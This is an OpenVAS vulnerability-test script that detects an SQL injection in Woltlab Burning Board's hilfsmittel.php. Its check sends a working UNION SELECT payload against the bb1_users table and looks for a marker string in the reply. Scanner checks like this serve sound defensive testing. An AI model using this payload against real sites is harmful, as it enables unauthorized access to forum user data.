###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_burning_board_46501.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Woltlab Burning Board 'hilfsmittel.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Woltlab Burning Board is prone to an SQL-injection vulnerability
because the application fails to properly sanitize user-supplied input
before using it in an SQL query.

A successful exploit could allow an attacker to compromise the
application, access or modify data, or exploit vulnerabilities in the
underlying database.

Woltlab Burning Board 2.3.6 is vulnerable; other versions may also
be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103089");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-02-23 13:14:43 +0100 (Wed, 23 Feb 2011)");
 script_bugtraq_id(46501);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("Woltlab Burning Board 'hilfsmittel.php' SQL Injection Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46501");
 script_xref(name : "URL" , value : "http://www.woltlab.com/de/");

 script_tag(name:"qod_type", value:"remote_vul"); 
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("secpod_woltlab_burning_board_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"BurningBoard"))exit(0);

url = string(dir, "/hilfsmittel.php?action=read&katid=5%27/**/UNION/**/SELECT/**/1,2,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10/**/FROM/**/bb1_users/*"); 

if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {

  security_message(port:port);
  exit(0);

}

exit(0);
